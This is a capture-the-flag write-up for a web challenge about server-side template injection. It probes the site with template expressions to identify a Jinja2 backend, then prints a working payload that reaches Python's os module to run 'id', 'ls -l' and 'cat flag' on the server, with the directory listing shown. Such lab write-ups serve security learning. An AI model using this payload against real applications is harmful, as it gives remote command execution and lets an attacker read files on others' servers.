# Description:
I made a cool website where you can announce whatever you want! 
Try it out!
I heard templating is a cool and modular way to build web apps! 
Check out my website here!
### Hints:
1. Server Side Template Injection

# Solution
Browse to the web site and you will see a web page that includes the text

### Verify SSTI
The hint has already given away that the site uses [server-side templates](https://portswigger.net/web-security/server-side-template-injection) but we need to verify that and find out the backend technology used.

To our help we use the following decision tree from [PortSwiggers page on Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

SSTI Decision Tree

The tests done are as follows:

Entering ${7*7} yields ${7*7},  
Entering {{7*7}} yields 49 and  
{{7*'7'}} yields 7777777  

So now we know we have a Jinja2 backend.

Googling around for SSTI Jinja2-payloads I found this one:` {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

Look for the flag
Using the payload` {{request.application.__globals__.__builtins__.__import__('os').popen('ls -l').read()}} `
              
drwxr-xr-x 2 root root   32 Apr 12 10:09 __pycache__  
-rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py  
-rw-r--r-- 1 root root   58 Mar  6 19:44 flag  
-rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt  
</h1>
So now we have the name and location of the flag

Get the flag
We get the flag with the payload` {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}  `
